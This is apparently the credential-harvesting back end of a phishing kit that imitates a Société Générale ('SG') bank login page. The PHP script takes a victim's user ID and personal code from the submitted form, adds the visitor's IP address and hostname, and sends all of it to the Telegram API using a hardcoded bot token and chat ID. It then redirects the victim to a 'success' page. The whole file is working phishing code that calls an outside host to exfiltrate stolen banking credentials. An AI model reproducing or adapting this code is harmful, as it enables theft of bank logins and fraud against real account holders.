<?php
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
if(!empty($_POST['user_id'])){
$message  = "[+]━━━━【🏦 SG / Login 】━━━[+]\n";
$message .= "[🆔 Identifiant]   : ".$_POST['user_id']."\n";
$message .= "[🔒 Code personnel] : " . $_POST['Hidden1']. "\n";
$message .= "\n";
$message .= "[🔍 IP INFO] : http://www.geoiptool.com/?IP=$ip\n";
$message .= "==========[ SG  INFO]=========";
$token = "8942970138:AAGWB2jmCozyKCo1PZX18paXoBFXRPumdm4";
    file_get_contents("https://api.telegram.org/bot$token/sendMessage?chat_id=8933881160&text=" . urlencode($message)."" );
header("Location:../../success.php");
}else{
header("Location:../../success.php");
}

?>
